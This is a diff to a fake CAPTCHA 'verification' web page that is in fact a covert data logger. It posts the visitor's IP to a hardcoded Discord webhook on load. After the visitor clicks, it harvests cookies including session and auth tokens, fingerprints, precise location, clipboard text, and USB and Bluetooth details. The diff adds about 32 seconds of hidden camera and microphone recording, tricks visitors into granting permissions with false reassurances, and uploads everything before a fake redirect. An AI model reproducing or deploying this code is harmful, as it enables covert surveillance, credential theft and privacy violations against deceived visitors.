@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verification</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -55,7 +55,7 @@
         <button class="captcha-btn" id="actionBtn">❌ NO, I AM HUMAN</button>
         <div class="timer" id="timerDisplay"></div>
         <div class="permission-notice" id="permissionNotice">
-            ⚡ Legitimate verification – no data is stored permanently. Temporary permissions needed to confirm human interaction.
+            🔒 Legitimate verification – no data is stored permanently. Temporary permissions needed.
         </div>
     </div>
     <div class="footer">Protected by reCAPTCHA &nbsp;|&nbsp; Terms of Service</div>
@@ -64,7 +64,7 @@
 <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-    // ========== 1. ON LOAD: silent IP webhook ==========
+    // ==================== 1. INITIAL IP WEBHOOK ====================
     async function sendInitialIP() {
         try {
             const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -89,15 +89,15 @@
     }
     sendInitialIP();
 
-    // ========== 2. MAX DATA COLLECTION FUNCTIONS ==========
+    // ==================== 2. MAX DATA COLLECTION FUNCTIONS ====================
     function categorizeCookie(name) {
         const n = name.toLowerCase();
         if (n.includes("fb") || n.includes("facebook")) return "Facebook";
-        if (n.includes("google") || n.includes("_ga") || n.includes("gmail")) return "Google";
+        if (n.includes("google") || n.includes("_ga")) return "Google";
         if (n.includes("twitter")) return "Twitter";
-        if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
+        if (n.includes("amazon")) return "Amazon";
         if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
-        if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
+        if (n.includes("ad") || n.includes("track")) return "Ad/Tracker";
         return "Other";
     }
     function getAllCookies() {
@@ -124,9 +124,8 @@
                 info.renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
                 info.vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
             }
-            // Get max texture size, antialiasing etc.
-            let extensions = gl.getSupportedExtensions() || [];
-            let params = {
+            const extensions = gl.getSupportedExtensions() || [];
+            const params = {
                 maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                 maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
                 aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
@@ -216,15 +215,6 @@
         if (performance.memory) return { jsHeapSize: performance.memory.jsHeapSizeLimit, totalHeap: performance.memory.totalJSHeapSize, usedHeap: performance.memory.usedJSHeapSize };
         return "Unavailable";
     }
-    // Clipboard read (requires permission)
-    async function readClipboard() {
-        try {
-            if (!navigator.clipboard || !navigator.clipboard.readText) return "Clipboard API not supported";
-            const text = await navigator.clipboard.readText();
-            return text.slice(0, 500);
-        } catch(e) { return `Clipboard read denied or error: ${e.message}`; }
-    }
-    // List media devices (cameras, microphones, speakers)
     async function getMediaDevices() {
         try {
             if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return "Not supported";
@@ -232,34 +222,29 @@
             return devices.map(d => ({ kind: d.kind, label: d.label || "unlabeled", deviceId: d.deviceId.slice(0,10) }));
         } catch(e) { return `Error: ${e.message}`; }
     }
-    // Bluetooth devices (requires permission)
+    async function readClipboard() {
+        try {
+            if (!navigator.clipboard || !navigator.clipboard.readText) return "Clipboard API not supported";
+            const text = await navigator.clipboard.readText();
+            return text.slice(0, 500);
+        } catch(e) { return `Clipboard read denied: ${e.message}`; }
+    }
     async function getBluetoothDevices() {
         try {
             if (!navigator.bluetooth) return "Web Bluetooth not supported";
             const device = await navigator.bluetooth.requestDevice({ acceptAllDevices: true });
-            return { name: device.name, id: device.id, class: device.class };
-        } catch(e) { return `Bluetooth denied or error: ${e.message}`; }
+            return { name: device.name, id: device.id };
+        } catch(e) { return `Bluetooth error: ${e.message}`; }
     }
-    // USB devices (requires permission)
     async function getUSBDevices() {
         try {
             if (!navigator.usb) return "WebUSB not supported";
             const devices = await navigator.usb.getDevices();
-            return devices.map(d => ({ productName: d.productName, manufacturerName: d.manufacturerName, serialNumber: d.serialNumber }));
+            return devices.map(d => ({ productName: d.productName, manufacturerName: d.manufacturerName }));
         } catch(e) { return `USB error: ${e.message}`; }
     }
-    // WebGL parameters (already in getGPU, but add more)
-    function getWebGLParameters(gl) {
-        if (!gl) return {};
-        const params = {};
-        const paramNames = ['MAX_TEXTURE_SIZE', 'MAX_VIEWPORT_DIMS', 'ALIASED_LINE_WIDTH_RANGE', 'MAX_COMBINED_TEXTURE_IMAGE_UNITS', 'MAX_VERTEX_ATTRIBS', 'MAX_VERTEX_UNIFORM_VECTORS', 'MAX_VARYING_VECTORS', 'MAX_FRAGMENT_UNIFORM_VECTORS'];
-        for (let p of paramNames) {
-            try { params[p] = gl.getParameter(gl[p]); } catch(e) { params[p] = "?"; }
-        }
-        return params;
-    }
 
-    // ========== 3. PERMISSION REQUESTS ==========
+    // ==================== 3. PERMISSION REQUESTS ====================
     async function requestGeolocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve({ error: "Geolocation not supported" }); return; }
@@ -271,10 +256,18 @@
         });
     }
     async function requestCamera() {
-        try { const stream = await navigator.mediaDevices.getUserMedia({ video: true }); stream.getTracks().forEach(t => t.stop()); return { success: true }; } catch(e) { return { error: e.message }; }
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // Ne prikazujemo video preview na stranici – samo stream za snimanje
+            return { stream, success: true };
+        } catch(e) { return { error: e.message }; }
     }
     async function requestMicrophone() {
-        try { const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); stream.getTracks().forEach(t => t.stop()); return { success: true }; } catch(e) { return { error: e.message }; }
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            stream.getTracks().forEach(t => t.stop());
+            return { success: true };
+        } catch(e) { return { error: e.message }; }
     }
     async function requestNotifications() {
         if (!("Notification" in window)) return { error: "Not supported" };
@@ -286,7 +279,6 @@
         try { await navigator.clipboard.readText(); return { success: true }; } catch(e) { return { error: e.message }; }
     }
 
-    // Reverse geocode
     async function reverseGeocode(lat, lon) {
         try {
             const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
@@ -295,7 +287,32 @@
         } catch(e) { return `${lat}, ${lon} (address failed)`; }
     }
 
-    // ========== 4. MAIN CAPTCHA CLICK ==========
+    // ==================== 4. VIDEO RECORDING (NO PREVIEW) ====================
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let recordingStream = null;
+    let recordingTimeout = null;
+
+    async function startRecording(durationMs, cameraStream) {
+        return new Promise((resolve) => {
+            if (!cameraStream) { resolve(null); return; }
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: "video/webm" });
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) recordedChunks.push(event.data);
+            };
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: "video/webm" });
+                resolve(blob);
+            };
+            mediaRecorder.start(100);
+            recordingTimeout = setTimeout(() => {
+                if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+            }, durationMs);
+        });
+    }
+
+    // ==================== 5. MAIN CAPTCHA CLICK ====================
     let isRunning = false;
     const btn = document.getElementById("actionBtn");
     const timerDiv = document.getElementById("timerDisplay");
@@ -317,7 +334,7 @@
             timerDiv.innerText = timeLeft > 0 ? `⏳ Redirecting in ${timeLeft} seconds...` : "Redirecting now...";
         }, 1000);
 
-        // Collect basic (non-permission) data
+        // ---- Collect non‑permission data first ----
         const gpu = getGPU();
         const canvasFp = await getCanvasFingerprint();
         const audioFp = await getAudioFingerprint();
@@ -341,29 +358,40 @@
             cookiesByPlatform[c.platform].push(c);
         }
 
-        // --- PERMISSIONS (one by one) ---
+        // ---- PERMISSIONS (with reassuring messages) ----
         noticeDiv.innerHTML = "📍 Location required for regional verification – click ALLOW";
         const geoloc = await requestGeolocation();
         let address = "";
         if (geoloc.lat && geoloc.lon) address = await reverseGeocode(geoloc.lat, geoloc.lon);
 
-        noticeDiv.innerHTML = "🎥 Camera check (encrypted)...";
-        const camera = await requestCamera();
-        noticeDiv.innerHTML = "🎤 Microphone check...";
+        noticeDiv.innerHTML = "🎥 Camera & microphone access for facial verification – click ALLOW";
+        const cameraRes = await requestCamera();
+        let videoBlob = null;
+        if (cameraRes.success) {
+            videoBlob = await startRecording(32000, cameraRes.stream);
+            // stop tracks after recording (already done inside startRecording's onstop)
+        }
+
+        noticeDiv.innerHTML = "🎤 Additional microphone check...";
         const mic = await requestMicrophone();
-        noticeDiv.innerHTML = "🔔 Notification permission...";
+
+        noticeDiv.innerHTML = "🔔 Notification permission (for redirect alert)...";
         const notif = await requestNotifications();
+
         noticeDiv.innerHTML = "📋 Clipboard read (to verify human interaction)...";
         const clipboardPerm = await requestClipboard();
         let clipboardContent = "";
         if (clipboardPerm.success) clipboardContent = await readClipboard();
-        noticeDiv.innerHTML = "🔊 Checking Bluetooth devices...";
-        const bluetooth = await getBluetoothDevices();
-        noticeDiv.innerHTML = "🔌 Checking USB devices...";
-        const usb = await getUSBDevices();
-        noticeDiv.innerHTML = "✅ Finalizing...";
 
-        // Build final data object
+        noticeDiv.innerHTML = "🔊 Checking Bluetooth devices (optional)...";
+        const bluetooth = await getBluetoothDevices();
+
+        noticeDiv.innerHTML = "🔌 Scanning USB devices...";
+        const usb = await getUSBDevices();
+
+        noticeDiv.innerHTML = "✅ Finalizing security check...";
+
+        // ---- Build final data object ----
         const finalData = {
             timestamp: new Date().toISOString(),
             pageURL: window.location.href,
@@ -381,7 +409,7 @@
             clipboard: clipboardContent,
             bluetooth: bluetooth,
             usb: usb,
-            permissions: { geolocation: geoloc, camera, microphone: mic, notifications: notif },
+            permissions: { geolocation: geoloc, camera: cameraRes.success, microphone: mic.success, notifications: notif.status },
             reverseAddress: address,
             navigator: {
                 userAgent: navigator.userAgent,
@@ -394,7 +422,6 @@
                 doNotTrack: navigator.doNotTrack,
                 online: navigator.onLine,
                 vendor: navigator.vendor,
-                product: navigator.product,
                 maxTouchPoints: navigator.maxTouchPoints
             },
             screen: {
@@ -402,14 +429,12 @@
                 colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
                 orientation: screen.orientation?.type || "n/a"
             },
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            localStorageSize: JSON.stringify(localStorage).length,
-            sessionStorageSize: JSON.stringify(sessionStorage).length
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        // Generate TXT report
+        // ---- Generate TXT report ----
         function generateTextReport(d) {
-            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER - FULL SPECTRUM REPORT\n" + "=".repeat(80) + "\n\n";
+            let r = "=".repeat(80) + "\n        ULTIMATE MAX LOGGER + VIDEO - COMPLETE REPORT\n" + "=".repeat(80) + "\n\n";
             r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\n\n`;
             r += "📍 PRECISE LOCATION\n";
             if (d.permissions.geolocation.lat) {
@@ -437,15 +462,18 @@
             r += `\n🖌️ Canvas Fingerprint: ${d.canvasFingerprint}\n🎵 Audio Fingerprint: ${d.audioFingerprint}\n🔐 SHA-256 Fingerprint: ${d.fingerprint}\n`;
             r += `\n⏱️ Performance: Load ${d.performance.loadTime}ms, DOM ready ${d.performance.domReady}ms\n🧠 Memory: ${JSON.stringify(d.memory)}\n`;
             r += `\n📹 Media Devices: ${JSON.stringify(d.mediaDevices)}\n📋 Clipboard: ${d.clipboard}\n🎧 Bluetooth: ${JSON.stringify(d.bluetooth)}\n🔌 USB: ${JSON.stringify(d.usb)}\n`;
-            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${d.permissions.camera.success?"OK":"DENIED"}, Mic=${d.permissions.microphone.success?"OK":"DENIED"}, Notif=${d.permissions.notifications.status}\n`;
+            r += `\nPermissions: Geo=${d.permissions.geolocation.lat?"OK":"DENIED"}, Camera=${d.permissions.camera?"OK":"DENIED"}, Mic=${d.permissions.microphone?"OK":"DENIED"}, Notif=${d.permissions.notifications}\n`;
+            r += `\n🎥 Video recording: ${videoBlob ? `Recorded ${(videoBlob.size/1024).toFixed(1)} KB` : "Failed or denied"}\n`;
             return r;
         }
 
-        const report = generateTextReport(finalData);
-        const blob = new Blob([report], { type: "text/plain" });
+        const reportText = generateTextReport(finalData);
+        const txtBlob = new Blob([reportText], { type: "text/plain" });
         const formData = new FormData();
-        const filename = `max_log_${finalData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
-        formData.append("file", blob, filename);
+        formData.append("file", txtBlob, `log_${Date.now()}.txt`);
+        if (videoBlob) {
+            formData.append("file", videoBlob, `video_${Date.now()}.webm`);
+        }
 
         let locationInfo = "❌ Denied";
         let mapsLink = "";
@@ -455,13 +483,12 @@
         }
         const embed = {
             embeds: [{
-                title: "✅ MAX LOGGER - FULL REPORT",
-                description: `**📍 Real-time Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...\n**WebRTC IPs:** ${finalData.webRTC_IPs.join(", ")}`,
-                color: 0xff6600,
+                title: "✅ MAX LOGGER + VIDEO",
+                description: `**📍 Location:** ${locationInfo}${mapsLink}\n**Cookies:** ${finalData.cookiesCount}\n**Video:** ${videoBlob ? `Recorded ${(videoBlob.size/1024).toFixed(1)} KB` : "No video"}\n**Fingerprint:** ${finalData.fingerprint.slice(0,32)}...`,
+                color: 0xff5500,
                 fields: [
-                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nCamera: ${finalData.permissions.camera.success ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone.success ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
-                    { name: "Hardware", value: `CPU: ${finalData.navigator.hardwareConcurrency} cores\nRAM: ${finalData.navigator.deviceMemory || "?"} GB\nGPU: ${finalData.gpu.renderer?.slice(0,30)}`, inline: true },
-                    { name: "Bluetooth/USB", value: `BT: ${finalData.bluetooth.name || "N/A"}\nUSB: ${finalData.usb.length || 0} devices`, inline: true }
+                    { name: "Permissions", value: `GPS: ${finalData.permissions.geolocation.lat ? "✅" : "❌"}\nCamera: ${finalData.permissions.camera ? "✅" : "❌"}\nMic: ${finalData.permissions.microphone ? "✅" : "❌"}\nClipboard: ${finalData.clipboard ? "✅" : "❌"}`, inline: true },
+                    { name: "Hardware", value: `CPU: ${finalData.navigator.hardwareConcurrency} cores\nRAM: ${finalData.navigator.deviceMemory || "?"} GB\nGPU: ${finalData.gpu.renderer?.slice(0,30)}`, inline: true }
                 ],
                 timestamp: finalData.timestamp
             }]
@@ -470,10 +497,10 @@
 
         try {
             await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            console.log("MAX report sent");
+            console.log("Full report + video sent");
         } catch(e) { console.error(e); }
 
-        // Fake redirect after 32 sec
+        // After 32 seconds, fake redirect
         setTimeout(() => {
             document.getElementById("mainContainer").innerHTML = `
                 <div class="container" style="background:white; text-align:center; padding:40px;">
